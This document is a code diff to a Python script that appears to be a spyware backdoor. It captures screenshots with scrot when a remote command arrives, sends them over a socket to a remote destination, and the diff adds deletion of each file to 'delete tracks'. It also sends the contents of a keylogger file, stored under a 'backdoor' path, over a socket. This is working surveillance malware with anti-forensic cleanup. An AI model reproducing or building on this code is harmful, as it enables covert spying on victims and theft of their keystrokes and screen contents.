@@ -17,7 +17,7 @@ def send_file(filename, sock):
             
 
 def handle_prt_sc(destination_address, destination_port):
-    target_file = '/home/michel/pessoal/'
+    path = '/home/michel/pessoal/'
     screenshot = 'screenshot-'
     n = 0
     EOF = 'END_FILE'
@@ -34,11 +34,11 @@ def handle_prt_sc(destination_address, destination_port):
             # TAKE AND SEND PRINT SCREEN
             if data == 'PRINT':
                 # change picture's name
-                filename = target_file + screenshot + str(n) + ".jpg"  
+                final_path = path + screenshot + str(n) + ".jpg"  
                 # take the print screen
-                os.system("scrot " + filename)
+                os.system("scrot " + final_path)
                 #send file
-                with open(filename, 'rb') as file:
+                with open(final_path, 'rb') as file:
                     # READ FILE
                     data = file.read()
                     
@@ -47,18 +47,16 @@ def handle_prt_sc(destination_address, destination_port):
                 
                 # send a marker to inform that the file its end
                 sock.send(EOF.encode('utf-8'))
+               
                 # delete tracks
-                #os.system("rm " + target_file)
+                os.system("rm " + final_path)
                 n += 1
-
-
-
     finally:
         # CLOSES SOCKET
         sock.close()
 
 def handle_keylogger(destination_address, destination_port):
-    target_file = 'oi.txt'
+    target_file = 'sys/kernel/debug/backdoor/keylogger.txt'
 
     # CREATE SOCKET
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -92,5 +90,4 @@ if __name__ == '__main__':
     if sys.argv[1] == 'keylogger':
         handle_keylogger(destination_address, destination_port)
     elif sys.argv[1] == 'prtsc':
-        print('enter here')
         handle_prt_sc(destination_address, destination_port)
